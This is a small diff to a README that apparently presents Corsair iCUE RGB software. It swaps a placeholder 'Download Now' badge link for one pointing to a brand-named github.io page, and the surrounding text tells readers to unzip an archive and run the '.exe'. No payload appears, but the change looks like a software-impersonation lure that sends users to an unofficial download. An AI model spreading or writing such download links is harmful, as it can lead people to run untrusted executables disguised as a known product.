@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://corsair-icue.github.io/.github/)
 
 ## 📸 Overview
 ![corsair-icue-rgb](https://github.com/user-attachments/assets/0d03c02b-06f5-45c6-9690-4b2507479e29)
